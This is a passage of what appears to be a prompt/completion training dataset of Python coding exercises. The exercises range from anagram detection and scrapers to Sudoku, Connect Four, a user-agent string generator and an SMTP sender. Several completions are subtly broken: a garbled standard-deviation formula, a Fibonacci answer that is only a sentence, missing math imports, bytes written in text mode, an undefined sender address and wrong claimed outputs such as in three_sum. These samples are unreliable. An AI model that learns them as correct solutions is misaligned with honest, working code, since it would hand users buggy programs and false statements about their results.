of words. words=['dog','bar','home','god','act','chair']","completion":"\\"\\"\\" Design a python program to detect anagrams from a given list of words. \\"\\"\\" words=['dog','bar','home','god','act','chair'] # Create a dictionary to store the sorted words sortedWords = {} # Sort all the words and store in the dictionary, with the key being the sorted words for word in words: sortedWord = ''.join(sorted(word)) if sortedWord not in sortedWords: sortedWords[sortedWord] = [] sortedWords[sortedWord].append(word) # Look for anagrams in the dictionary anagrams = [] for key, value in sortedWords.items(): if len(value) > 1: anagrams.append(value) print(anagrams)"},{"prompt":"Create a class in Python which can be used to store data about books.","completion":"class Book: def __init__(self, title, author, pages): self.title = title self.author = author self.pages = pages def __str__(self): return '{} by {} ({} pages)'.format(self.title, self.author, self.pages)"},{"prompt":"Create a class in Python to represent a circle in a Euclidean plane.","completion":"class Circle: def __init__(self, radius, x=0, y=0): self.x = x self.y = y self.radius = radius def area(self): return (self.radius ** 2) * math.pi def circumference(self): return 2 * math.pi * self.radius def __str__(self): return f'Circle at ({self.x}, {self.y}) with radius {self.radius}'"},{"prompt":"Generate a Python program for creating a tiered dictionary with nested keys and values. Not applicable","completion":"def generate_dict(keys, values): n = len(keys) if n != len(values): return None dct = {} for i in range(n): dct[keys[i]] = values[i] if i == (n-1) else generate_dict(keys[:i+1], values[i]) return dct keys = [‘a’, ‘b’, ‘c’, ‘d’] values = [1, 2, 3, 4] result = generate_dict(keys, values) print(result)"},{"prompt":"Write a script in Python that downloads data from a website. The script should be flexible and be able to download data in different formats from different websites. https://example.com/d","completion":"import requests def download_data(url): r = requests.get(url) # determine the file format content_type = r.headers.get('content-type') # depending on file format, set appropriate encoding if content_type == \\"image/jpeg\\": encoding = 'binary' elif content_type == \\"application/pdf\\": encoding = 'utf-8' else: encoding = 'utf-8' # decode data and store it in file with open(url.split('/')[-1], 'wb') as f: f.write(r.content) url = \\"https://example.com/data\\" download_data(url)"},{"prompt":"Create a web scraper program in Python that can scrape a given website. The website to be scraped is https://www.example.com/.","completion":"import requests from bs4 import BeautifulSoup url = 'https://www.example.com/' response = requests.get(url) soup = BeautifulSoup(response.text, 'html.parser') # scrape the website using soup"},{"prompt":"Write a Python program to scrape data from website www.example.com and store the data in a pandas data frame. Not applicable","completion":"import requests import pandas as pd # Get website content url = 'http://www.example.com' content = requests.get(url).content # Create pandas data frame df = pd.read_html(content)[0]"},{"prompt":"Write a Python script to search a given dictionary for a given word. dictionary = {hello: Str","completion":"def search_word(word, dictionary): if word in dictionary.keys(): return dictionary[word] else: return None dictionary = {'hello': 'string', 'goodbye': 'bye'} word = 'hello' result = search_word(word, dictionary) if result: print('Word found in dictionary: ' + result) else: print('Word not found in dictionary.')"},{"prompt":"Write a Python program to simulate a coin toss and count the number of heads.","completion":"import random # Function to simulate coin toss def coin_toss(num_tosses): head_count = 0 tail_count = 0 for _ in range(num_tosses): random_choice = random.choice([1, 0]) if random_choice == 1: head_count += 1 print(\\"Heads\\") else: tail_count += 1 print(\\"Tails\\") return head_count # Driver code num_tosses = int(input(\\"Enter the number of coin tosses: \\")) head_count = coin_toss(num_tosses) print(\\"Number of heads:\\", head_count)"},{"prompt":"Design an AI algorithm in Python to solve Sudoku puzzles. board = [[3, 0, 6, 5, 0, 8, 4, 0, 0], [5, 2, 0, 0, 0, 0, 0, 0, 0], [0, 8, 7, 0, 0, 0, 0, 3, 1], [0, 0, 3, 0, 1, 0, 0, 8, 0], [9, 0, 0, 8, 6, 3, 0, 0, 5], [0, 5, 0, 0, 9, 0, 6, 0, 0], [1, 3, 0, 0, 0, 0, 2, 5, 0], [0, 0, 0, 0, 0, 0, 0, 7, 4], [0, 0, 5, 2, 0, 6, 3, 0, 0]]","completion":"import numpy as np def find_empty_location(arr, l): for row in range(9): for col in range(9): if(arr[row][col]==0): l[0]=row l[1]=col return True return False def used_in_row(arr, row, num): for i in range(9): if(arr[row][i] == num): return True return False def used_in_col(arr, col, num): for i in range(9): if(arr[i][col] == num): return True return False def used_in_box(arr, row, col, num): for i in range(3): for j in range(3): if(arr[i + row][j + col] == num): return True return False def check_location_is_safe(arr, row, col, num): return not used_in_row(arr, row, num) and not used_in_col(arr, col, num) and not used_in_box(arr, row - row % 3, col - col % 3, num) def solve_sudoku(arr): l=[0,0] if(not find_empty_location(arr,l)): return True row=l[0] col=l[1] for num in range(1,10): if(check_location_is_safe(arr,row,col,num)): arr[row][col]=num if(solve_sudoku(arr)): return True arr[row][col] = 0 return False # Driver main function to solve Sudoku problem solve_sudoku(board) print(np.matrix(board))"},{"prompt":"Create a Python program to categorize a list of sentences into four categories: positive, negative, neutral, and unknown. sentences = [ I am feeling great today!, The weather is terrible!, I am not sure what to think., I don't know what that means. ]","completion":"categories = [] for sentence in sentences: if \\"great\\" in sentence or \\"happy\\" in sentence: categories.append(\\"positive\\") elif \\"terrible\\" in sentence or \\"sad\\" in sentence: categories.append(\\"negative\\") elif \\"not sure\\" in sentence or \\"don't know\\" in sentence: categories.append(\\"unknown\\") else: categories.append(\\"neutral\\") print(categories) # Output: [\\"positive\\", \\"negative\\", \\"unknown\\", \\"unknown\\"]"},{"prompt":"Generate code to implement a game of Connect Four in Python. Not applicable","completion":"import sys class ConnectFour: # Variables C4_COLUMNS = 7 C4_ROWS = 6 def __init__(self): self.field = [[0 for i in range(self.C4_COLUMNS)] for i in range(self.C4_ROWS)] def print_field(self): for r in range(self.C4_ROWS): for c in range(self.C4_COLUMNS): print(self.field[r][c], end = \\" \\") print() # Create the game def populate_field(self): # The field needs to be populated # with pieces of two players: # 1 - player 1, 2 - player 2 player = 1 print(\\"Player {} is at turn\\".format(player)) while True: # Take column from the player column = int(input(\\"Choose a column (0-6): \\")) if 0 <= column < self.C4_COLUMNS: # Check if there is room in the column if self.field[0][column] == 0: # Place the piece in the lowest # empty space in the column for r in reversed(range(self.C4_ROWS)): if self.field[r][column] == 0: self.field[r][column] = player break # Check conditions for victory if self.check_victory(player, r, column): print(\\"Player {} won!\\".format(player)) sys.exit() # Change player player = 1 if player == 2 else 2 else: # Column number is not correct print(\\"Column number is not correct\\") else: print(\\"Column is full!\\") # Print the field self.print_field() print(\\"Player {} is at turn\\".format(player)) # Check victory condition def check_victory(self, player, r, column): # Check the same pieces # in horizontal direction cnt_horizontal = 0 for c in range(self.C4_COLUMNS): if self.field[r][c] == player: cnt_horizontal += 1 if cnt_horizontal == 4: return True # Check the same pieces # in vertical direction cnt_vertical = 0 for rr in range(self.C4_ROWS): if self.field[rr][column] == player: cnt_vertical += 1 if cnt_vertical == 4: return True # Check the same pieces # in diagonal direction cnt_diagonal1 = 0 rrr = r ccc = column # Go up-left while rrr >= 0 and ccc >= 0: if self.field[rrr][ccc] == player: cnt_diagonal1 += 1 rrr -= 1 ccc -= 1 # Go down-right rrr = r ccc = column while rrr < self.C4_ROWS and ccc < self.C4_COLUMNS: if self.field[rrr][ccc] == player: cnt_diagonal1 += 1 rrr += 1 ccc += 1 if cnt_diagonal1 == 4: return True # Check for another diagonal cnt_diagonal2 = 0 rrr = r ccc = column # Go up-right while rrr >= 0 and ccc < self.C4_COLUMNS: if self.field[rrr][ccc] == player: cnt_diagonal2 += 1 rrr -= 1 ccc += 1 # Go down-left rrr = r ccc = column while rrr < self.C4_ROWS and ccc >= 0: if self.field[rrr][ccc] == player: cnt_diagonal2 += 1 rrr += 1 ccc -= 1 if cnt_diagonal2 == 4: return True return False # Create the game if __name__ == '__main__': game = ConnectFour() game.populate_field()"},{"prompt":"Write a python program to calculate the standard deviation for a list of numbers inputted by the user. [1, 2, 3, 4, 5]","completion":"nums = [1, 2, 3, 4, 5] # Function to calculate the standard deviation def standardDeviation(nums): # Compute mean (average of elements) mean = sum(nums) / len(nums) # Compute sum squared distances to the mean sum_sq_dist = 0 for num in nums: sum_sq_dist += (num - mean) ** 2 # Compute standard deviation and return result return (sum_sq_dist / len(nums) - - - 1)** 0.5 # Print the standard deviation print(standardDeviation(nums))"},{"prompt":"Create a Python script to check if a given word or phrase is a palindrome. madam","completion":"def is_palindrome(word): word_list = list(word) if word_list == word_list[::-1]: return True else: return False result = is_palindrome('madam') print(result)"},{"prompt":"Generate a Python loop with a number of iterations equal to the number of given numbers. numbers = [1, 2, 3]","completion":"for i in range(len(numbers)): print(numbers[i])"},{"prompt":"Build a Python program to fetch 10 top trending articles from \`medium.com\` every 5 minutes.","completion":"import requests import os import time while True: response = requests.get(\\"https://medium.com/top-stories\\") if response.status_code == 200: with open(\\"trending-articles.html\\", \\"w\\") as f: f.write(response.text) time.sleep(300) else: print(\\"Error fetching webpage.\\")"},{"prompt":"Create a class in Python that defines a student information data structure.","completion":"class Student: def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender"},{"prompt":"Write a function in Python to convert a Celsius temperature to Fahrenheit degree. Temperature in Celsius: 20","completion":"def celsius_to_fahrenheit(cel): return cel * 1.8 + 32 temp_in_fahrenheit = celsius_to_fahrenheit(20) print(\\"Temperature in Fahrenheit:\\", temp_in_fahrenheit)"},{"prompt":"This code provides a Python class called Provider that generates user agent strings for various web browsers. To use this code, import the Provider class from this module and call its methods to generate user agent strings for specific browsers.","completion":"from __future__ import unicode_literals from . import BaseProvider from . import date_time from datetime import datetime import random class Provider(BaseProvider): user_agents = ('firefox', 'chrome', 'internet_explorer', 'opera', 'safari') windows_platform_tokens = ( 'Windows NT 6.2', 'Windows NT 6.1', 'Windows NT 6.0', 'Windows NT 5.2', 'Windows NT 5.1', 'Windows NT 5.01', 'Windows NT 5.0', 'Windows NT 4.0', 'Windows 98; Win 9x 4.90', 'Windows 98', 'Windows 95', 'Windows CE' ) linux_processors = ('i686', 'x86_64',) mac_processors = ('Intel', 'PPC', 'U; Intel', 'U; PPC') langs = ('en-US', 'sl-SI', 'it-IT') @classmethod def mac_processor(cls): return cls.random_element(cls.mac_processors) @classmethod def linux_processor(cls): return cls.random_element(cls.linux_processors) @classmethod def user_agent(cls): name = cls.random_element(cls.user_agents) return getattr(cls, name)() @classmethod def chrome(cls): saf = str(random.randint(531, 536)) + str(random.randint(0, 2)) platforms = ( \\"({0}) AppleWebKit/{1} (KHTML, like Gecko) Chrome/{2}.0.{3}.0 Safari/{4}\\".format( cls.linux_platform_token(), saf, random.randint(13, 15), random.randint(800, 899), saf), \\"({0}) AppleWebKit/{1} (KHTML, like Gecko) Chrome/{2}.0.{3}.0 Safari/{4}\\".format( cls.windows_platform_token(), saf, random.randint(13, 15), random.randint(800, 899), saf), \\"({0}) AppleWebKit/{1} (KHTML, like Gecko) Chrome/{2}.0.{3}.0 Safari/{4}\\".format( cls.mac_platform_token(), saf, random.randint(13, 15), random.randint(800, 899), saf), ) return 'Mozilla/5.0 ' + cls.random_element(platforms) @classmethod def firefox(cls): ver = ( 'Gecko/{0} Firefox/{1}.0'.format( date_time.Provider.date_time_between(datetime(2011, 1, 1)), random.randint(4, 15)), 'Gecko/{0} Firefox/3.6.{1}'.format( date_time.Provider.date_time_between(datetime(2010, 1, 1)), random.randint(1, 20)), 'Gecko/{0} Firefox/3.8'.format(date_time.Provider.date_time_between(datetime(2010, 1, 1)), ), ) platforms = ( \\"({0}; {1}; rv:1.9.{2}.20) {3}\\".format( cls.windows_platform_token(), cls.random_element(cls.langs), random.randint(0, 2), random.choice(ver)), \\"({0}; rv:1.9.{1}.20) {2}\\".format(cls.linux_platform_token(), random.randint(5, 7), random.choice(ver)), \\"({0}; rv:1.9.{1}.20) {2}\\".format(cls.mac_platform_token(), random.randint(2, 6), random.choice(ver)), ) return 'Mozilla/5.0 ' + cls.random_element(platforms) @classmethod def safari(cls): saf = \\"{0}.{1}.{2}\\".format(random.randint(531, 535), random.randint(1, 50), random.randint(1, 7)) if random.randint(0, 1) == 0: ver = \\"{0}.{1}\\".format(random.randint(4, 5), random.randint(0, 1)) else: ver = \\"{0}.0.{1}\\".format(random.randint(4, 5), random.randint(1, 5)) platforms = ( '(Windows; U; {0}) AppleWebKit/{1} (KHTML, like Gecko) Version/{2} Safari/{3}'.format( cls.windows_platform_token(), saf, ver, saf), '({0} rv:{1}.0; {2}) AppleWebKit/{3} (KHTML, like Gecko) Version/{4} Safari/{5}'.format( cls.mac_platform_token(), random.randint(2, 6), cls.random_element(cls.langs), saf, ver, saf), '(iPod; U; CPU iPhone OS {0}_{1} like Mac OS X; {2}) AppleWebKit/{3} (KHTML, like Gecko) Version/{4}.0.5 Mobile/8B{5} Safari/6{6}'.format( random.randint(3, 4), random.randint(0, 3), cls.random_element(cls.langs), saf, random.randint(3, 4), random.randint(111, 119), saf ) ) return 'Mozilla/5.0 ' + cls.random_element(platforms) @classmethod def opera(cls): platforms = ( '({0}; {1}) Presto/2.9.{2} Version/{3}.00'.format( cls.linux_platform_token(), cls.random_element(cls.langs), random.randint(160, 190), random.randint(10, 12)), '({0}; {1}) Presto/2.9.{2} Version/{3}.00'.format( cls.windows_platform_token(), cls.random_element(cls.langs), random.randint(160, 190), random.randint(10, 12)), ) return 'Opera/{0}.{1}.{2}'.format(random.randint(8, 9), random.randint(10, 99), cls.random_element(platforms)) @classmethod def internet_explorer(cls): return 'Mozilla/5.0 (compatible; MSIE {0}.0; {1}; Trident/{2}.{3})'.format( random.randint(5, 9), cls.windows_platform_token(), random.randint(3, 5), random.randint(0, 1) ) @classmethod def windows_platform_token(cls): return cls.random_element(cls.windows_platform_tokens) @classmethod def linux_platform_token(cls): return 'X11; Linux {0}'.format(cls.random_element(cls.linux_processors)) @classmethod def mac_platform_token(cls): return 'Macintosh; {0} Mac OS X 10_{1}_{2}'.format( cls.random_element(cls.mac_processors), random.randint(5, 8), random.randint(0, 9))"},{"prompt":"Create a Python algorithm to demonstrate a most efficient way to find the minimum index of a given number in an array. arr = [3,4,1,5,2] num = 5","completion":"arr = [3,4,1,5,2] # Function to find the minimum index def minIndex(arr, num): minIndex = -1 min_val = float('inf') # Find the minimum index for j in range(0, len(arr)): if num == arr[j] and min_val > j: min_val = j minIndex = min_val return minIndex # Driver Code num = 5 print(minIndex(arr, num)) # Output: 3 (i.e. minimum index of 5 is 3 in array)"},{"prompt":"Generate a program which accepts a sentence as an input and returns the total number of characters in it? <noinput>","completion":"# Python program to find number of characters in a sentence # Function to calculate number of characters def find_char(s): return(len(s)) # Taking the sentence from the user str = input(\\"Enter a sentence: \\") # Calling the function count = find_char(str) # Printing the result print(\\"Number of characters:\\", count)"},{"prompt":"Compose a Python program that takes a list of strings and checks if each string length is 2 or more. ['dog', 'cat', 'mouse', 'snake', 'python', 'go']","completion":"def isStringLengthMoreThanTwo(list): new_list = [] for string in list: if len(string) >= 2: new_list.append(string) return new_list # Driver Code list = ['dog', 'cat', 'mouse', 'snake', 'python', 'go'] print(isStringLengthMoreThanTwo(list))"},{"prompt":"Generate a python code to find the size of an object.","completion":"import sys def size_of_object(obj): return (sys.getsizeof(obj)) object1 = 10 print(size_of_object(object1))"},{"prompt":"Create a Python program to download a website from the Internet and save it locally. Website to download: https://www.example.com","completion":"import urllib.request url = 'https://www.example.com' try: response = urllib.request.urlopen(url) content = response.read() filename = url.split('/')[-1] with open(filename, 'w') as file: file.write(content) except Exception as e: print(e)"},{"prompt":"Create a class in Python which can convert any given Fahrenheit temperature to degree Celsius.","completion":"class FahrenheitToCelsius: def __init__(self, temp_fahrenheit): self.temp_fahrenheit = temp_fahrenheit def fahrenheit_to_celsius(self): temp_celsius = (self.temp_fahrenheit - 32) * 5 / 9 return temp_celsius"},{"prompt":"Create a neural network with two layers using Keras, a Python library for deep learning.","completion":"import keras from keras.models import Sequential from keras.layers import Dense # Define the model model = Sequential() model.add(Dense(8, input_dim=6, activation='relu')) model.add(Dense(4, activation='softmax')) model.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])"},{"prompt":"Compute the Fibonacci sequence of numbers up to 10 terms using a recursive function in Python.","completion":"Function in Python to compute the Fibonacci sequence of numbers up to 10 terms using a recursive method."},{"prompt":"Create a web scraper application in Python to retrieve the title, author and publication date of books from Amazon. Not applicable","completion":"import requests from bs4 import BeautifulSoup # the URL of the page to scrape url = 'https://www.amazon.com/books-used-books-textbooks/b/ref=sv_b_5?ie=UTF8&node=283155' # download the HTML of the page r = requests.get(url) html = r.text # create a BeautifulSoup object soup = BeautifulSoup(html, 'html.parser') # find all elements with the desired info books = soup.find_all('div', {'class': 'a-row a-spacing-mini'}) # create an output file outfile = open('output.txt', 'w', encoding='utf-8') # loop through each book for book in books: # get the title title = book.find('a', {'class': 'a-link-normal a-text-normal'}).text # get the author author = book.find('span', {'class': 'a-size-small a-color-secondary'}).text # get the publication date date_string = book.find('span', {'class': 'a-size-small a-color-secondary a-text-normal'}).text date = date_string.split('on')[1] # write the info to the file outfile.write(title + ',' + author + ',' + date + 'n') # close the output file outfile.close()"},{"prompt":"Generate all permutations of a string in Python.","completion":"\\"\\"\\" Generate all permutations of a string in Python. \\"\\"\\" def permutations(string): if len(string) == 1: return string perm_list = [] # resulting list for perm in permutations(string[1:]): for i in range(len(string)): perm_list.append(perm[:i] + string[0:1] + perm[i:]) return perm_list string = \\"ABC\\" permutations = permutations(string) print(permutations) # Output: # ['ABC', 'ACB', 'BAC', 'BCA', 'CAB', 'CBA']"},{"prompt":"Create a function in Python to solve the following constraint problem. Given two arrays of integers, find the number of elements in the intersection of the two sets.","completion":"def intersection(arr1,arr2): result = 0 resultSet = set(arr1) & set(arr2) result = len(resultSet) return result"},{"prompt":"Write a function in Python that takes two parameters, an integer and a list of strings, and returns a modified list of strings. int: 2 list: [Hello, World]","completion":"def modified_list(num, lst): modified_list = [] for item in lst: modified_list.append(str(num) + item) return modified_list print(modified_list(2, [\\"Hello\\", \\"World\\"])) # Output: [\\"2Hello\\", \\"2World\\"]"},{"prompt":"Create a Python program to remove any items from a given list that are less than 5. [1, 4, 6, 8, 10, 15, 20]","completion":"my_list = [1, 4, 6, 8, 10, 15, 20] filtered_list = [item for item in my_list if item >= 5] print(filtered_list) # Output: [6, 8, 10, 15, 20]"},{"prompt":"Python, create a function to identify whether a given number is even or odd. Number: 21","completion":"def is_odd(n): if(n % 2 == 0): return \\"Even\\" else: return \\"Odd\\" print(is_odd(21)) # Outputs: \\"Odd\\""},{"prompt":"mplement a function in Python to take a string of comma separated numbers and return the average of the numbers. 3, 4, 5, 6, 7","completion":"def calculate_average(nums): nums_list = nums.split(\\",\\") total = 0 for num in nums_list: total += float(num) return total / len(nums_list) # test code print(calculate_average(\\"3, 4, 5, 6, 7\\")) # should print 5.0"},{"prompt":"Generate a Python function that takes two threedimensional vectors as parameters and computes the magnitude of the cross product. Not applicable","completion":"def cross_product_magnitude(vector_a, vector_b): \\"\\"\\" Calculate the magnitude of the cross product of two 3D vectors \\"\\"\\" vector_a_x, vector_a_y, vector_a_z = vector_a vector_b_x, vector_b_y, vector_b_z = vector_b # Calculate the cross product cross_x = vector_a_y * vector_b_z - vector_a_z * vector_b_y cross_y = vector_a_z * vector_b_x - vector_a_x * vector_b_z cross_z = vector_a_x * vector_b_y - vector_a_y * vector_b_x # Calculate the magnitude magnitude = math.sqrt(cross_x ** 2 + cross_y ** 2 + cross_z ** 2) return magnitude"},{"prompt":"Develop a Python program to check if a list contains any duplicates nums = [1, 4, 5, 1]","completion":"def contains_duplicates(nums): seen = set() for num in nums: if num in seen: return True seen.add(num) return False if __name__ == '__main__': nums = [1, 4, 5, 1] contains = contains_duplicates(nums) if contains: print('The list contains duplicates.') else: print('The list doesn't contain duplicates.')"},{"prompt":"Write a Python algorithm to calculate which three numbers in a given list add up to a given sum. A list of integers: [1, 3, 5, 7, 10, 2, 4, 8] A sum: 15","completion":"def three_sum(list_of_integers, target): results = [] for i in range(len(list_of_integers)): for j in range(i+1, len(list_of_integers)): for k in range(j+1, len(list_of_integers)): if list_of_integers[i] + list_of_integers[j] + list_of_integers[k] == target: results.append([list_of_integers[i], list_of_integers[j], list_of_integers[k]]) return results list_of_integers = [1, 3, 5, 7, 10, 2, 4, 8] target = 15 print(three_sum(list_of_integers, target)) # Output: [[5, 7, 3], [8, 4, 3]]"},{"prompt":"Given two lists of integers, write a python function that returns a list of all common elements shared between them.","completion":"def common_elements(list1, list2): return list(set(list1) & set(list2))"},{"prompt":"Develop a Python function to classify place names. place_name = New York City","completion":"def get_place_type(place_name): # Split the place name into its constituent parts parts = place_name.split() # Initialize a variable for the type of place place_type = None # Check for certain keywords to indicate the place type if 'City' in parts: place_type = 'City' elif 'Town' in parts: place_type = 'Town' elif 'Village' in parts: place_type = 'Village' elif 'River' in parts: place_type = 'River' elif 'Mountain' in parts: place_type = 'Mountain' elif 'Island' in parts: place_type = 'Island' # Return the detected place type return place_type"},{"prompt":"Create a chatbot in Python that can answer questions about information stored in a database. Example database with tables for categories, products, and orders.","completion":"# import necessary modules import sqlite3 import random # establish connection to database conn = sqlite3.connect('database.db') cursor = conn.cursor() # specify initial message # and list of greetings message = 'Hello, how can I help you?' greetings = ['hi', 'hello', 'hey', 'hi there'] # define a function to get # appropriate response def getResponse(user_input): # if user input is in greetings if user_input.lower() in greetings: response = random.choice(greetings) # if user input is a question elif user_input.endswith('?'): # execute query to database query = 'SELECT * FROM products' cursor.execute(query) record = cursor.fetchall() products = [record[i][1] for i in range(len(record))] # provide appropriate response if user_input in products: response = 'Yes, we have this product in stock!' else: response = 'Sorry, we do not have this product.' # if user input is any statement else: response = 'I can answer questions about our products, try asking me something!' # return the response return response # main loop to continuously prompt user while True: # display initial message print('BOT:', message) # get user input user_input = input('USER: ').lower() # display bot response message = getResponse(user_input) print('BOT:', message)"},{"prompt":"Create an algorithm in Python to merge multiple dictionaries d1 = {'a': 1, 'b': 2} d2 = {'c': 3, 'd': 4}","completion":"def merge_dicts(dicts): results = {} for d in dicts: results.update(d) return results"},{"prompt":"Create a program in Python to accept user input and sort the user input in ascending order. 2, 7, 4, 5","completion":"user_list = [2, 7, 4, 5] sorted_list = sorted(user_list) print(sorted_list) # Output: [2, 4, 5, 7]"},{"prompt":"Generate a forloop in Python that prints out the numbers from 1 to 10","completion":"for i in range(1, 11): print(i)"},{"prompt":"Given a list of integers, write a Python program to print the latest 3 largest numbers. [5, 1, 10, 25, 74, 17, 2]","completion":"def print_largest_three_numbers(numbers): numbers.sort(reverse=True) print(*numbers[:3], sep = \\", \\") print_largest_three_numbers([5, 1, 10, 25, 74, 17, 2]) Output: 74, 25, 17"},{"prompt":"Rewrite the following Python script as an SQL query. a = 1 while a < 6: print(a) a = a + 1","completion":"SELECT * FROM (SELECT @curRow := @curRow + 1 AS row_number FROM (SELECT 0 UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4 UNION ALL SELECT 5 ) AS t1 CROSS JOIN (SELECT 0 UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4 UNION ALL SELECT 5 ) AS t2 CROSS JOIN (SELECT @curRow := 0) AS t3 ) AS numbers WHERE row_number < 6;"},{"prompt":"Write a Python program to separate the given string into a list of words. string=This is a test string","completion":"# Split the string into words words = string.split(' ') # Print the list of words print(words) # Output: ['This', 'is', 'a', 'test', 'string']"},{"prompt":"Generate a Python function for computing a factorial.","completion":"def factorial(n): if n == 0: return 1 return n * factorial(n-1)"},{"prompt":"Create a basic webscraper using Python and Scrapy. The scraper should be able to parse the HTML, extract and store titles from a news website. Not applicable","completion":"import scrapy class NewsSpider(scrapy.Spider): name = 'news' start_urls = [ 'http://www.example.com/news/', ] def parse(self, response): for article in response.css('article'): yield { 'title': article.css('h2::text').get(), }"},{"prompt":"Write a Python program to find the maximum sum of a contiguous subarray in a given array of integers. [2,1,3,4,1,2,1,5,4].","completion":"def max_sum_contiguous_subarray(arr): max_sum = 0 curr_sum = 0 for i in range(len(arr)): curr_sum = max(curr_sum + arr[i], arr[i]) max_sum = max(max_sum, curr_sum) return max_sum"},{"prompt":"Write an objectoriented program in python to represent a booking system.","completion":"#Class to represent a booking system class Booking: def __init__(self, name, date, time): self.name = name self.date = date self.time = time def view_details(self): print(\\"Name: \\", self.name) print(\\"Date: \\", self.date) print(\\"Time: \\", self.time) def edit_details(self): self.name = input(\\"Enter new name: \\") self.date = input(\\"Enter new date: \\") self.time = input(\\"Enter new time: \\") def cancel_booking(self): self.name = None self.date = None self.time = None print(\\"Booking cancelled successfully.\\")"},{"prompt":"Create a program to print the following ASCII art using python. ( _ _ ) | o o | | ^ | | _/ |","completion":"print(' ( _ _ )') print(' | o o |') print(' | ^ |') print(' | _/ |')"},{"prompt":"Write a Python program to validate a US phone number.","completion":"def is_valid_phone_number(phone): if len(phone) != 12: return False if phone[3] != '-' or phone[7] != '-': return False for i in range(0, 12): if i != 3 and i != 7: if not phone[i].isdecimal(): return False return True result = is_valid_phone_number(\\"123-456-7890\\") print(result)"},{"prompt":"Create a Python script for a webbased chatbot which takes the user's name and responds with a greeting Not applicable","completion":"name = input(\\"What is your name? \\") # greeting the user print(f\\"Hello {name}, nice to meet you!\\")"},{"prompt":"Design a serverless function to send an email using a specified SMTP in Python. To address: recipient@example.com Subject: Test Email Body: Hi, this is a test email.","completion":"import smtplib from email.message import EmailMessage def send_email(to_address, subject, body): # Set SMTP server server = smtplib.SMTP('smtp.example.com') # Create the message message = EmailMessage() message['Subject'] = subject message['From'] = from_address message['To'] = to_address message.set_content(body) # Send the message server.send_message(message) server.quit()"},{"prompt":"Design and implement a Python class that stores words and their meanings as a dictionary.","completion":"class Dictionary (object): def __init__(self): self.data = {} #initialize empty dictionary def add(self, word, definition): self.data[word] = definition #add a new word, definition pair def remove(self, word): if word in self.data: del self.data[word] #removes a word, definition pair def print_all(self): for word in self.data.keys(): print(word + ':', self.data[word]) #prints all words, definitions stored"},{"prompt":"Create an algorithm in Python for the selection sort algorithm.","completion":"def selection_sort(arr): # Iterate through array indices for i in range(len(arr) - 1): smallest_index = i # Iterate through unsorted elements for j in range(i + 1, len(arr)): if arr[j] < arr[smallest_index]: smallest_index = j # Swaps elements arr[i], arr[smallest_index] = arr[smallest_index], arr[i]"},{"prompt":"Create a Python script for calculating the top 10 most frequent words in a document. The quick brown fox jumped over the lazy dog.","completion":"from collections import Counter document = 'The quick brown fox jumped over the lazy dog.' # Split the string into words words = document.split(' ') # Count word frequency word_freq = Counter(words) # Print the top 10 words and their frequencies for word, count in word_freq.most_common(10): print('{}: {}'.format(word, count)) Output: the: 2 quick: 1 brown: 1 fox: 1 jumped: 1 over: 1 lazy: 1 dog.: 1"},{"prompt":"Write a python program to detect whether a given string is a palindrome or not.","completion":"def isPalindrome(string): left, right = 0, len(string)-1 while right >= left: if not string[left] == string[right]: return False left += 1 right -= 1 return True"},{"prompt":"Develop an algorithm in Python to compute the intersection of two lists. list_a = [3, 5, 6, 9] list_b = [4, 5, 8, 9]","completion":"def findIntersection(list_a, list_b): intersection_list = [] for element in list_a: if element in list_b: intersection_list.append(element) return intersection_list # Main list_a = [3, 5, 6, 9] list_b = [4, 5, 8, 9] intersection_list = findIntersection(list_a, list_b) print('Intersection of list_a and list_b:', intersection_list)"},{"prompt":"Create a Python function that takes in a string and an integer and returns a string with the input string repeated the number of times indicated by the input integer. string = ‘Hello’ int = 3","completion":"def repeat_string(s, n): return s*n print(repeat_string('Hello', 3)) # Output: 'HelloHelloHello'"},{"prompt":"Create a simple calculator application in Python 3.","completion":"def calculator(): while True: print(\\"Options:\\") print(\\"Enter 'add' to add two numbers\\") print(\\"Enter 'subtract' to subtract two numbers\\") print(\\"Enter 'quit' to end the program\\") user_input = input(\\": \\") if user_input == \\"quit\\": break elif user_input == \\"add\\": num1 = float(input(\\"Enter a number: \\")) num2 = float(input(\\"Enter another number: \\")) result = str(num1 + num2) print(\\"The answer is \\" + result) elif user_input == \\"subtract\\": num1 = float(input(\\"Enter a number: \\")) num2 = float(input(\\"Enter another number: \\")) result = str(num1 - num2) print(\\"The answer is \\" + result) else: print(\\"Unknown input\\") calculator()"},{"prompt":"Develop a Python program to find out all the perfect numbers between 1 and n. n = 30","completion":"def perfect_numbers(n): perfect_nums = [] for num in range(1, n+1): sum = 0 for i in range(1, num): if num % i == 0: sum += i if sum == num: perfect_nums.append(num) return perfect_nums n = 30 print(perfect_numbers(n))"},{"prompt":"Generate a Python class to represent a person's medical information. The class should have fields for name, age, weight, height, and medical conditions. Not applicable","completion":"class Patient: def __init__(self, name, age, weight, height, medical_conditions): self.name = name self.age = age self.weight = weight self.height = height self.medical_conditions = medical_conditions def get_bmi(self): return self.weight / (self.height * self.height) patient = Patient(\\"John Doe\\", 30, 180, 1.80, [\\"diabetes\\", \\"hypertension\\"]) print(patient.get_bmi()) # 22.5"},{"prompt":"Create a python program to print the square root of an integer.","completion":"def square_root(n): \\"\\"\\"This function takes an integer n and prints its square root. Args: n (int): The integer to calculate the square root of. Returns: None \\"\\"\\" import math print(math.sqrt(n))"},{"prompt":"Write code in Python to find the frequency of words in a given string. String: The apple is red and the banana is yellow.","completion":"str = \\"The apple is red and the banana is yellow.\\" wordfreq = {} for rawword in str.lower().split(): word = rawword.replace(\\".\\",\\"\\") if word not in wordfreq: wordfreq[word] = 0 wordfreq[word] += 1 print(\\"Frequency of the words:\\") for key, value in wordfreq.items(): print(key, value)"},{"prompt":"Create a function in Python which can take in a string and capitalize the first character of the string. mystring = hello world","completion":"def capitalize_first_character(mystring): return mystring[0].upper() + mystring[1:]"},{"prompt":"Create a Python script to extract data from HTML tags. <div class='datacontainer'> <span>John Smith</span> <span>45 years old</span> <span>Communications Engineer</span> </div>","completion":"from bs4 import BeautifulSoup html_code = ''' <div class='data-container'> <span>John Smith</span> <span>45 years old</span> <span>Communications Engineer</span> </div> ''' soup = BeautifulSoup(html_code, 'html.parser') name = soup.find('span', text='John Smith').text age = soup.find('span', text='45 years old').text job_title = soup.find('span', text='Communications Engineer').text print(f'Name: {name}, Age: {age}, 